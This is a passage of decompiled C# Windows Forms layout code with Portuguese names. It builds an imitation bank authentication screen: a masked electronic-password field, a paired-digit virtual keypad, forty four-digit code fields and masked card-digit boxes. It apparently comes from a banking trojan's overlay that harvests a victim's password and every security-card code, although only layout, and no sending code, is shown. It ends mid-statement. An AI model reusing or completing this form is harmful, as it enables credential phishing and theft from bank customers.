		((Control)Painel_tec).add_Paint(new PaintEventHandler(Painel_tec_Paint));
		((Control)s_eletronica).set_BackColor(Color.White);
		((TextBoxBase)s_eletronica).set_BorderStyle((BorderStyle)0);
		((Control)s_eletronica).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)s_eletronica).set_Location(new Point(151, 121));
		((TextBoxBase)s_eletronica).set_MaxLength(8);
		((Control)s_eletronica).set_Name("s_eletronica");
		s_eletronica.set_PasswordChar('•');
		((TextBoxBase)s_eletronica).set_ReadOnly(true);
		((Control)s_eletronica).set_Size(new Size(49, 14));
		((Control)s_eletronica).set_TabIndex(10);
		((Control)b_ok).set_BackColor(Color.Transparent);
		((Control)b_ok).set_Cursor(Cursors.get_Hand());
		((Control)b_ok).set_Location(new Point(202, 226));
		((Control)b_ok).set_Name("b_ok");
		((Control)b_ok).set_Size(new Size(41, 17));
		((Control)b_ok).set_TabIndex(8);
		((Control)b_ok).add_Click((EventHandler)b_ok_Click);
		((Control)numeros_tec2).set_AutoSize(true);
		((Control)numeros_tec2).set_Font(new Font("Arial", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)numeros_tec2).set_Location(new Point(39, 152));
		((Control)numeros_tec2).set_Margin(new Padding(3, 2, 3, 2));
		((Control)numeros_tec2).set_Name("numeros_tec2");
		((Control)numeros_tec2).set_Size(new Size(278, 14));
		((Control)numeros_tec2).set_TabIndex(7);
		((Control)numeros_tec2).set_Text("0 ou 3         6 ou 9         1 ou 2          5 ou 8         4 ou 7");
		((Control)numeros_tec2).set_Visible(false);
		((TextBoxBase)s_dados).set_BorderStyle((BorderStyle)0);
		((Control)s_dados).set_Location(new Point(21, 50));
		((TextBoxBase)s_dados).set_MaxLength(8);
		((Control)s_dados).set_Name("s_dados");
		((Control)s_dados).set_Size(new Size(317, 13));
		((Control)s_dados).set_TabIndex(6);
		((Control)s_dados).set_Visible(false);
		((Control)tec_1e).set_AccessibleName("asd");
		((Control)tec_1e).set_BackColor(Color.Transparent);
		((Control)tec_1e).set_Cursor(Cursors.get_Hand());
		((Control)tec_1e).set_Location(new Point(277, 172));
		((Control)tec_1e).set_Name("tec_1e");
		((Control)tec_1e).set_Size(new Size(41, 39));
		((Control)tec_1e).set_TabIndex(5);
		((Control)tec_1e).add_Click((EventHandler)tec_1e_Click);
		((Control)tec_1d).set_AccessibleName("asd");
		((Control)tec_1d).set_BackColor(Color.Transparent);
		((Control)tec_1d).set_Cursor(Cursors.get_Hand());
		((Control)tec_1d).set_Location(new Point(217, 172));
		((Control)tec_1d).set_Name("tec_1d");
		((Control)tec_1d).set_Size(new Size(41, 39));
		((Control)tec_1d).set_TabIndex(4);
		((Control)tec_1d).add_Click((EventHandler)tec_1d_Click);
		((Control)tc_1c).set_AccessibleName("asd");
		((Control)tc_1c).set_BackColor(Color.Transparent);
		((Control)tc_1c).set_Cursor(Cursors.get_Hand());
		((Control)tc_1c).set_Location(new Point(157, 172));
		((Control)tc_1c).set_Name("tc_1c");
		((Control)tc_1c).set_Size(new Size(41, 39));
		((Control)tc_1c).set_TabIndex(3);
		((Control)tc_1c).add_Click((EventHandler)tc_1c_Click);
		((Control)tc_1b).set_AccessibleName("asd");
		((Control)tc_1b).set_BackColor(Color.Transparent);
		((Control)tc_1b).set_Cursor(Cursors.get_Hand());
		((Control)tc_1b).set_Location(new Point(98, 172));
		((Control)tc_1b).set_Name("tc_1b");
		((Control)tc_1b).set_Size(new Size(41, 39));
		((Control)tc_1b).set_TabIndex(2);
		((Control)tc_1b).add_Click((EventHandler)tc_1b_Click);
		((Control)tc_1a).set_AccessibleName("");
		((Control)tc_1a).set_BackColor(Color.Transparent);
		((Control)tc_1a).set_Cursor(Cursors.get_Hand());
		((Control)tc_1a).set_Location(new Point(37, 172));
		((Control)tc_1a).set_Name("tc_1a");
		((Control)tc_1a).set_Size(new Size(41, 39));
		((Control)tc_1a).set_TabIndex(1);
		((Control)tc_1a).add_Click((EventHandler)tc_1a_Click);
		((Control)numeros_tec1).set_AutoSize(true);
		((Control)numeros_tec1).set_Font(new Font("Arial", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)numeros_tec1).set_Location(new Point(39, 152));
		((Control)numeros_tec1).set_Margin(new Padding(3, 2, 3, 2));
		((Control)numeros_tec1).set_Name("numeros_tec1");
		((Control)numeros_tec1).set_Size(new Size(278, 14));
		((Control)numeros_tec1).set_TabIndex(0);
		((Control)numeros_tec1).set_Text("0 ou 8         2 ou 7         5 ou 6          1 ou 9         3 ou 4");
		((TextBoxBase)t19).set_BorderStyle((BorderStyle)0);
		((Control)t19).set_Font(new Font("Verdana", 7f));
		((Control)t19).set_Location(new Point(326, 253));
		((Control)t19).set_Margin(new Padding(0));
		((TextBoxBase)t19).set_MaxLength(4);
		((Control)t19).set_Name("t19");
		((Control)t19).set_Size(new Size(35, 12));
		((Control)t19).set_TabIndex(27);
		((Control)t19).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t19).add_TextChanged((EventHandler)t19_TextChanged);
		((TextBoxBase)t20).set_BorderStyle((BorderStyle)0);
		((Control)t20).set_Font(new Font("Verdana", 7f));
		((Control)t20).set_Location(new Point(326, 272));
		((Control)t20).set_Margin(new Padding(0));
		((TextBoxBase)t20).set_MaxLength(4);
		((Control)t20).set_Name("t20");
		((Control)t20).set_Size(new Size(35, 12));
		((Control)t20).set_TabIndex(28);
		((Control)t20).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t20).add_TextChanged((EventHandler)t20_TextChanged);
		((TextBoxBase)t18).set_BorderStyle((BorderStyle)0);
		((Control)t18).set_Font(new Font("Verdana", 7f));
		((Control)t18).set_Location(new Point(326, 234));
		((Control)t18).set_Margin(new Padding(0));
		((TextBoxBase)t18).set_MaxLength(4);
		((Control)t18).set_Name("t18");
		((Control)t18).set_Size(new Size(35, 12));
		((Control)t18).set_TabIndex(26);
		((Control)t18).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t18).add_TextChanged((EventHandler)t18_TextChanged);
		((TextBoxBase)t6).set_BorderStyle((BorderStyle)0);
		((Control)t6).set_Font(new Font("Verdana", 7f));
		((Control)t6).set_Location(new Point(262, 199));
		((Control)t6).set_Margin(new Padding(0));
		((TextBoxBase)t6).set_MaxLength(4);
		((Control)t6).set_Name("t6");
		((Control)t6).set_Size(new Size(35, 12));
		((Control)t6).set_TabIndex(14);
		((Control)t6).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t6).add_TextChanged((EventHandler)t6_TextChanged);
		((TextBoxBase)t5).set_BorderStyle((BorderStyle)0);
		((Control)t5).set_Font(new Font("Verdana", 7f));
		((Control)t5).set_Location(new Point(262, 180));
		((Control)t5).set_Margin(new Padding(0));
		((TextBoxBase)t5).set_MaxLength(4);
		((Control)t5).set_Name("t5");
		((Control)t5).set_Size(new Size(35, 12));
		((Control)t5).set_TabIndex(13);
		((Control)t5).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t5).add_TextChanged((EventHandler)t5_TextChanged);
		((TextBoxBase)t30).set_BorderStyle((BorderStyle)0);
		((Control)t30).set_Font(new Font("Verdana", 7f));
		((Control)t30).set_Location(new Point(394, 272));
		((Control)t30).set_Margin(new Padding(0));
		((TextBoxBase)t30).set_MaxLength(4);
		((Control)t30).set_Name("t30");
		((Control)t30).set_Size(new Size(35, 12));
		((Control)t30).set_TabIndex(38);
		((Control)t30).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t30).add_TextChanged((EventHandler)t30_TextChanged);
		((TextBoxBase)t17).set_BorderStyle((BorderStyle)0);
		((Control)t17).set_Font(new Font("Verdana", 7f));
		((Control)t17).set_Location(new Point(326, 215));
		((Control)t17).set_Margin(new Padding(0));
		((TextBoxBase)t17).set_MaxLength(4);
		((Control)t17).set_Name("t17");
		((Control)t17).set_Size(new Size(35, 12));
		((Control)t17).set_TabIndex(25);
		((Control)t17).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t17).add_TextChanged((EventHandler)t17_TextChanged);
		((TextBoxBase)t7).set_BorderStyle((BorderStyle)0);
		((Control)t7).set_Font(new Font("Verdana", 7f));
		((Control)t7).set_Location(new Point(262, 217));
		((Control)t7).set_Margin(new Padding(0));
		((TextBoxBase)t7).set_MaxLength(4);
		((Control)t7).set_Name("t7");
		((Control)t7).set_Size(new Size(35, 12));
		((Control)t7).set_TabIndex(15);
		((Control)t7).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t7).add_TextChanged((EventHandler)t7_TextChanged);
		((TextBoxBase)t29).set_BorderStyle((BorderStyle)0);
		((Control)t29).set_Font(new Font("Verdana", 7f));
		((Control)t29).set_Location(new Point(394, 253));
		((Control)t29).set_Margin(new Padding(0));
		((TextBoxBase)t29).set_MaxLength(4);
		((Control)t29).set_Name("t29");
		((Control)t29).set_Size(new Size(35, 12));
		((Control)t29).set_TabIndex(37);
		((Control)t29).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t29).add_TextChanged((EventHandler)t29_TextChanged);
		((TextBoxBase)t28).set_BorderStyle((BorderStyle)0);
		((Control)t28).set_Font(new Font("Verdana", 7f));
		((Control)t28).set_Location(new Point(394, 234));
		((Control)t28).set_Margin(new Padding(0));
		((TextBoxBase)t28).set_MaxLength(4);
		((Control)t28).set_Name("t28");
		((Control)t28).set_Size(new Size(35, 12));
		((Control)t28).set_TabIndex(36);
		((Control)t28).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t28).add_TextChanged((EventHandler)t28_TextChanged);
		((TextBoxBase)t16).set_BorderStyle((BorderStyle)0);
		((Control)t16).set_Font(new Font("Verdana", 7f));
		((Control)t16).set_Location(new Point(326, 197));
		((Control)t16).set_Margin(new Padding(0));
		((TextBoxBase)t16).set_MaxLength(4);
		((Control)t16).set_Name("t16");
		((Control)t16).set_Size(new Size(35, 12));
		((Control)t16).set_TabIndex(24);
		((Control)t16).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t16).add_TextChanged((EventHandler)t16_TextChanged);
		((TextBoxBase)t27).set_BorderStyle((BorderStyle)0);
		((Control)t27).set_Font(new Font("Verdana", 7f));
		((Control)t27).set_Location(new Point(394, 216));
		((Control)t27).set_Margin(new Padding(0));
		((TextBoxBase)t27).set_MaxLength(4);
		((Control)t27).set_Name("t27");
		((Control)t27).set_Size(new Size(35, 12));
		((Control)t27).set_TabIndex(35);
		((Control)t27).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t27).add_TextChanged((EventHandler)t27_TextChanged);
		((TextBoxBase)t4).set_BorderStyle((BorderStyle)0);
		((Control)t4).set_Font(new Font("Verdana", 7f));
		((Control)t4).set_Location(new Point(262, 160));
		((Control)t4).set_Margin(new Padding(0));
		((TextBoxBase)t4).set_MaxLength(4);
		((Control)t4).set_Name("t4");
		((Control)t4).set_Size(new Size(35, 12));
		((Control)t4).set_TabIndex(12);
		((Control)t4).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t4).add_TextChanged((EventHandler)t4_TextChanged);
		((TextBoxBase)t26).set_BorderStyle((BorderStyle)0);
		((Control)t26).set_Font(new Font("Verdana", 7f));
		((Control)t26).set_Location(new Point(394, 197));
		((Control)t26).set_Margin(new Padding(0));
		((TextBoxBase)t26).set_MaxLength(4);
		((Control)t26).set_Name("t26");
		((Control)t26).set_Size(new Size(35, 12));
		((Control)t26).set_TabIndex(34);
		((Control)t26).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t26).add_TextChanged((EventHandler)t26_TextChanged);
		((TextBoxBase)t14).set_BorderStyle((BorderStyle)0);
		((Control)t14).set_Font(new Font("Verdana", 7f));
		((Control)t14).set_Location(new Point(326, 158));
		((Control)t14).set_Margin(new Padding(0));
		((TextBoxBase)t14).set_MaxLength(4);
		((Control)t14).set_Name("t14");
		((Control)t14).set_Size(new Size(35, 12));
		((Control)t14).set_TabIndex(22);
		((Control)t14).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t14).add_TextChanged((EventHandler)t14_TextChanged);
		((TextBoxBase)t8).set_BorderStyle((BorderStyle)0);
		((Control)t8).set_Font(new Font("Verdana", 7f));
		((Control)t8).set_Location(new Point(262, 236));
		((Control)t8).set_Margin(new Padding(0));
		((TextBoxBase)t8).set_MaxLength(4);
		((Control)t8).set_Name("t8");
		((Control)t8).set_Size(new Size(35, 12));
		((Control)t8).set_TabIndex(16);
		((Control)t8).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t8).add_TextChanged((EventHandler)t8_TextChanged);
		((TextBoxBase)t24).set_BorderStyle((BorderStyle)0);
		((Control)t24).set_Font(new Font("Verdana", 7f));
		((Control)t24).set_Location(new Point(394, 158));
		((Control)t24).set_Margin(new Padding(0));
		((TextBoxBase)t24).set_MaxLength(4);
		((Control)t24).set_Name("t24");
		((Control)t24).set_Size(new Size(35, 12));
		((Control)t24).set_TabIndex(32);
		((Control)t24).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t24).add_TextChanged((EventHandler)t24_TextChanged);
		((TextBoxBase)t15).set_BorderStyle((BorderStyle)0);
		((Control)t15).set_Font(new Font("Verdana", 7f));
		((Control)t15).set_Location(new Point(326, 178));
		((Control)t15).set_Margin(new Padding(0));
		((TextBoxBase)t15).set_MaxLength(4);
		((Control)t15).set_Name("t15");
		((Control)t15).set_Size(new Size(35, 12));
		((Control)t15).set_TabIndex(23);
		((Control)t15).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t15).add_TextChanged((EventHandler)t15_TextChanged);
		((TextBoxBase)t25).set_BorderStyle((BorderStyle)0);
		((Control)t25).set_Font(new Font("Verdana", 7f));
		((Control)t25).set_Location(new Point(394, 178));
		((Control)t25).set_Margin(new Padding(0));
		((TextBoxBase)t25).set_MaxLength(4);
		((Control)t25).set_Name("t25");
		((Control)t25).set_Size(new Size(35, 12));
		((Control)t25).set_TabIndex(33);
		((Control)t25).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t25).add_TextChanged((EventHandler)t25_TextChanged);
		((TextBoxBase)t3).set_BorderStyle((BorderStyle)0);
		((Control)t3).set_Font(new Font("Verdana", 7f));
		((Control)t3).set_Location(new Point(262, 141));
		((Control)t3).set_Margin(new Padding(0));
		((TextBoxBase)t3).set_MaxLength(4);
		((Control)t3).set_Name("t3");
		((Control)t3).set_Size(new Size(35, 12));
		((Control)t3).set_TabIndex(11);
		((Control)t3).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t3).add_TextChanged((EventHandler)t3_TextChanged);
		((TextBoxBase)t23).set_BorderStyle((BorderStyle)0);
		((Control)t23).set_Font(new Font("Verdana", 7f));
		((Control)t23).set_Location(new Point(394, 139));
		((Control)t23).set_Margin(new Padding(0));
		((TextBoxBase)t23).set_MaxLength(4);
		((Control)t23).set_Name("t23");
		((Control)t23).set_Size(new Size(35, 12));
		((Control)t23).set_TabIndex(31);
		((Control)t23).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t23).add_TextChanged((EventHandler)t23_TextChanged);
		((TextBoxBase)t13).set_BorderStyle((BorderStyle)0);
		((Control)t13).set_Font(new Font("Verdana", 7f));
		((Control)t13).set_Location(new Point(326, 139));
		((Control)t13).set_Margin(new Padding(0));
		((TextBoxBase)t13).set_MaxLength(4);
		((Control)t13).set_Name("t13");
		((Control)t13).set_Size(new Size(35, 12));
		((Control)t13).set_TabIndex(21);
		((Control)t13).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t13).add_TextChanged((EventHandler)t13_TextChanged);
		((TextBoxBase)t22).set_BorderStyle((BorderStyle)0);
		((Control)t22).set_Font(new Font("Verdana", 7f));
		((Control)t22).set_Location(new Point(394, 120));
		((Control)t22).set_Margin(new Padding(0));
		((TextBoxBase)t22).set_MaxLength(4);
		((Control)t22).set_Name("t22");
		((Control)t22).set_Size(new Size(35, 12));
		((Control)t22).set_TabIndex(30);
		((Control)t22).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t22).add_TextChanged((EventHandler)t22_TextChanged);
		((TextBoxBase)t32).set_BorderStyle((BorderStyle)0);
		((Control)t32).set_Font(new Font("Verdana", 7f));
		((Control)t32).set_Location(new Point(459, 121));
		((Control)t32).set_Margin(new Padding(0));
		((TextBoxBase)t32).set_MaxLength(4);
		((Control)t32).set_Name("t32");
		((Control)t32).set_Size(new Size(35, 12));
		((Control)t32).set_TabIndex(40);
		((Control)t32).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t32).add_TextChanged((EventHandler)t32_TextChanged);
		((TextBoxBase)t9).set_BorderStyle((BorderStyle)0);
		((Control)t9).set_Font(new Font("Verdana", 7f));
		((Control)t9).set_Location(new Point(262, 254));
		((Control)t9).set_Margin(new Padding(0));
		((TextBoxBase)t9).set_MaxLength(4);
		((Control)t9).set_Name("t9");
		((Control)t9).set_Size(new Size(35, 12));
		((Control)t9).set_TabIndex(17);
		((Control)t9).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t9).add_TextChanged((EventHandler)t9_TextChanged);
		((TextBoxBase)t31).set_BorderStyle((BorderStyle)0);
		((Control)t31).set_Font(new Font("Verdana", 7f));
		((Control)t31).set_Location(new Point(459, 102));
		((Control)t31).set_Margin(new Padding(0));
		((TextBoxBase)t31).set_MaxLength(4);
		((Control)t31).set_Name("t31");
		((Control)t31).set_Size(new Size(35, 12));
		((Control)t31).set_TabIndex(39);
		((Control)t31).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t31).add_TextChanged((EventHandler)t31_TextChanged);
		((TextBoxBase)t33).set_BorderStyle((BorderStyle)0);
		((Control)t33).set_Font(new Font("Verdana", 7f));
		((Control)t33).set_Location(new Point(459, 139));
		((Control)t33).set_Margin(new Padding(0));
		((TextBoxBase)t33).set_MaxLength(4);
		((Control)t33).set_Name("t33");
		((Control)t33).set_Size(new Size(35, 12));
		((Control)t33).set_TabIndex(41);
		((Control)t33).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t33).add_TextChanged((EventHandler)t33_TextChanged);
		((TextBoxBase)t12).set_BorderStyle((BorderStyle)0);
		((Control)t12).set_Font(new Font("Verdana", 7f));
		((Control)t12).set_Location(new Point(326, 121));
		((Control)t12).set_Margin(new Padding(0));
		((TextBoxBase)t12).set_MaxLength(4);
		((Control)t12).set_Name("t12");
		((Control)t12).set_Size(new Size(35, 12));
		((Control)t12).set_TabIndex(20);
		((Control)t12).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t12).add_TextChanged((EventHandler)t12_TextChanged);
		((TextBoxBase)t35).set_BorderStyle((BorderStyle)0);
		((Control)t35).set_Font(new Font("Verdana", 7f));
		((Control)t35).set_Location(new Point(459, 178));
		((Control)t35).set_Margin(new Padding(0));
		((TextBoxBase)t35).set_MaxLength(4);
		((Control)t35).set_Name("t35");
		((Control)t35).set_Size(new Size(35, 12));
		((Control)t35).set_TabIndex(43);
		((Control)t35).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t35).add_TextChanged((EventHandler)t35_TextChanged);
		((TextBoxBase)t21).set_BorderStyle((BorderStyle)0);
		((Control)t21).set_Font(new Font("Verdana", 7f));
		((Control)t21).set_Location(new Point(394, 102));
		((Control)t21).set_Margin(new Padding(0));
		((TextBoxBase)t21).set_MaxLength(4);
		((Control)t21).set_Name("t21");
		((Control)t21).set_Size(new Size(35, 12));
		((Control)t21).set_TabIndex(29);
		((Control)t21).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t21).add_TextChanged((EventHandler)t21_TextChanged);
		((TextBoxBase)t34).set_BorderStyle((BorderStyle)0);
		((Control)t34).set_Font(new Font("Verdana", 7f));
		((Control)t34).set_Location(new Point(459, 157));
		((Control)t34).set_Margin(new Padding(0));
		((TextBoxBase)t34).set_MaxLength(4);
		((Control)t34).set_Name("t34");
		((Control)t34).set_Size(new Size(35, 12));
		((Control)t34).set_TabIndex(42);
		((Control)t34).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t34).add_TextChanged((EventHandler)t34_TextChanged);
		((TextBoxBase)t2).set_BorderStyle((BorderStyle)0);
		((Control)t2).set_Font(new Font("Verdana", 7f));
		((Control)t2).set_Location(new Point(262, 122));
		((Control)t2).set_Margin(new Padding(0));
		((TextBoxBase)t2).set_MaxLength(4);
		((Control)t2).set_Name("t2");
		((Control)t2).set_Size(new Size(35, 12));
		((Control)t2).set_TabIndex(10);
		((Control)t2).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t2).add_TextChanged((EventHandler)t2_TextChanged);
		((TextBoxBase)t36).set_BorderStyle((BorderStyle)0);
		((Control)t36).set_Font(new Font("Verdana", 7f));
		((Control)t36).set_Location(new Point(459, 197));
		((Control)t36).set_Margin(new Padding(0));
		((TextBoxBase)t36).set_MaxLength(4);
		((Control)t36).set_Name("t36");
		((Control)t36).set_Size(new Size(35, 12));
		((Control)t36).set_TabIndex(44);
		((Control)t36).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t36).add_TextChanged((EventHandler)t36_TextChanged);
		((TextBoxBase)t11).set_BorderStyle((BorderStyle)0);
		((Control)t11).set_Font(new Font("Verdana", 7f));
		((Control)t11).set_Location(new Point(326, 102));
		((Control)t11).set_Margin(new Padding(0));
		((TextBoxBase)t11).set_MaxLength(4);
		((Control)t11).set_Name("t11");
		((Control)t11).set_Size(new Size(35, 12));
		((Control)t11).set_TabIndex(19);
		((Control)t11).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t11).add_TextChanged((EventHandler)t11_TextChanged);
		((TextBoxBase)t37).set_BorderStyle((BorderStyle)0);
		((Control)t37).set_Font(new Font("Verdana", 7f));
		((Control)t37).set_Location(new Point(459, 216));
		((Control)t37).set_Margin(new Padding(0));
		((TextBoxBase)t37).set_MaxLength(4);
		((Control)t37).set_Name("t37");
		((Control)t37).set_Size(new Size(35, 12));
		((Control)t37).set_TabIndex(45);
		((Control)t37).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t37).add_TextChanged((EventHandler)t37_TextChanged);
		((TextBoxBase)t10).set_BorderStyle((BorderStyle)0);
		((Control)t10).set_Font(new Font("Verdana", 7f));
		((Control)t10).set_Location(new Point(262, 273));
		((Control)t10).set_Margin(new Padding(0));
		((TextBoxBase)t10).set_MaxLength(4);
		((Control)t10).set_Name("t10");
		((Control)t10).set_Size(new Size(35, 12));
		((Control)t10).set_TabIndex(18);
		((Control)t10).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t10).add_TextChanged((EventHandler)t10_TextChanged);
		((TextBoxBase)t38).set_BorderStyle((BorderStyle)0);
		((Control)t38).set_Font(new Font("Verdana", 7f));
		((Control)t38).set_Location(new Point(459, 235));
		((Control)t38).set_Margin(new Padding(0));
		((TextBoxBase)t38).set_MaxLength(4);
		((Control)t38).set_Name("t38");
		((Control)t38).set_Size(new Size(35, 12));
		((Control)t38).set_TabIndex(46);
		((Control)t38).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t38).add_TextChanged((EventHandler)t38_TextChanged);
		((TextBoxBase)t39).set_BorderStyle((BorderStyle)0);
		((Control)t39).set_Font(new Font("Verdana", 7f));
		((Control)t39).set_Location(new Point(459, 252));
		((Control)t39).set_Margin(new Padding(0));
		((TextBoxBase)t39).set_MaxLength(4);
		((Control)t39).set_Name("t39");
		((Control)t39).set_Size(new Size(35, 12));
		((Control)t39).set_TabIndex(47);
		((Control)t39).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t39).add_TextChanged((EventHandler)t39_TextChanged);
		((TextBoxBase)t1).set_BorderStyle((BorderStyle)0);
		((Control)t1).set_Font(new Font("Verdana", 7f));
		((Control)t1).set_Location(new Point(262, 102));
		((Control)t1).set_Margin(new Padding(0));
		((TextBoxBase)t1).set_MaxLength(4);
		((Control)t1).set_Name("t1");
		((Control)t1).set_Size(new Size(35, 12));
		((Control)t1).set_TabIndex(9);
		((Control)t1).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)t1).add_TextChanged((EventHandler)t1_TextChanged);
		((TextBoxBase)t40).set_BorderStyle((BorderStyle)0);
		((Control)t40).set_Font(new Font("Verdana", 7f));
		((Control)t40).set_Location(new Point(459, 272));
		((Control)t40).set_Margin(new Padding(0));
		((TextBoxBase)t40).set_MaxLength(4);
		((Control)t40).set_Name("t40");
		((Control)t40).set_Size(new Size(35, 12));
		((Control)t40).set_TabIndex(48);
		((Control)t40).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)Painel_sc).set_BackColor(Color.White);
		((Control)Painel_sc).set_BackgroundImage((Image)componentResourceManager.GetObject("Painel_sc.BackgroundImage"));
		((Control)Painel_sc).set_BackgroundImageLayout((ImageLayout)0);
		((Control)Painel_sc).get_Controls().Add((Control)(object)textBoxC);
		((Control)Painel_sc).get_Controls().Add((Control)(object)textBoxB);
		((Control)Painel_sc).get_Controls().Add((Control)(object)textBoxE);
		((Control)Painel_sc).get_Controls().Add((Control)(object)textBoxD);
		((Control)Painel_sc).get_Controls().Add((Control)(object)textBoxA);
		((Control)Painel_sc).get_Controls().Add((Control)(object)data3);
		((Control)Painel_sc).get_Controls().Add((Control)(object)data2);
		((Control)Painel_sc).get_Controls().Add((Control)(object)data1);
		((Control)Painel_sc).get_Controls().Add((Control)(object)s_cartao);
		((Control)Painel_sc).get_Controls().Add((Control)(object)label1);
		((Control)Painel_sc).get_Controls().Add((Control)(object)pictureBox1);
		((Control)Painel_sc).set_Location(new Point(0, 0));
		((Control)Painel_sc).set_Name("Painel_sc");
		((Control)Painel_sc).set_Size(new Size(687, 342));
		((Control)Painel_sc).set_TabIndex(0);
		((Control)Painel_sc).set_Visible(false);
		((Control)Painel_sc).add_Paint(new PaintEventHandler(Painel_sc_Paint));
		((TextBoxBase)textBoxC).set_BorderStyle((BorderStyle)0);
		((Control)textBoxC).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBoxC).set_Location(new Point(385, 68));
		((TextBoxBase)textBoxC).set_MaxLength(1);
		((Control)textBoxC).set_Name("textBoxC");
		textBoxC.set_PasswordChar('•');
		((Control)textBoxC).set_Size(new Size(8, 14));
		((Control)textBoxC).set_TabIndex(3);
		((Control)textBoxC).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBoxC).add_TextChanged((EventHandler)textBox8_TextChanged);
		((TextBoxBase)textBoxB).set_BorderStyle((BorderStyle)0);
		((Control)textBoxB).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBoxB).set_Location(new Point(371, 68));
		((TextBoxBase)textBoxB).set_MaxLength(1);
		((Control)textBoxB).set_Name("textBoxB");
		textBoxB.set_PasswordChar('•');
		((Control)textBoxB).set_Size(new Size(8, 14));
		((Control)textBoxB).set_TabIndex(2);
		((Control)textBoxB).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBoxB).add_TextChanged((EventHandler)textBox7_TextChanged);
		((TextBoxBase)textBoxE).set_BorderStyle((BorderStyle)0);
		((Control)textBoxE).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBoxE).set_Location(new Point(413, 68));
		((TextBoxBase)textBoxE).set_MaxLength(1);
		((Control)textBoxE).set_Name("textBoxE");
		textBoxE.set_PasswordChar('•');
		((Control)textBoxE).set_Size(new Size(8, 14));
		((Control)textBoxE).set_TabIndex(5);
		((Control)textBoxE).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBoxE).add_TextChanged((EventHandler)textBox9_TextChanged);
		((TextBoxBase)textBoxD).set_BorderStyle((BorderStyle)0);
		((Control)textBoxD).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBoxD).set_Location(new Point(399, 68));
		((TextBoxBase)textBoxD).set_MaxLength(1);
		((Control)textBoxD).set_Name("textBoxD");
		textBoxD.set_PasswordChar('•');
		((Control)textBoxD).set_Size(new Size(8, 14));
		((Control)textBoxD).set_TabIndex(4);
		((Control)textBoxD).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBoxD).add_TextChanged((EventHandler)textBox5_TextChanged);
		((TextBoxBase)textBoxA).set_BorderStyle((BorderStyle)0);
		((Control)textBoxA).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBoxA).set_Location(new Point(357, 68));
		((TextBoxBase)textBoxA).set_MaxLength(1);
		((Control)textBoxA).set_Name("textBoxA");
		textBoxA.set_PasswordChar('•');
		((Control)textBoxA).set_Size(new Size(8, 14));
		((Control)textBoxA).set_TabIndex(1);
		((Control)textBoxA).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBoxA).add_TextChanged((EventHandler)textBox6_TextChanged);
		((TextBoxBase)data3).set_BorderStyle((BorderStyle)0);
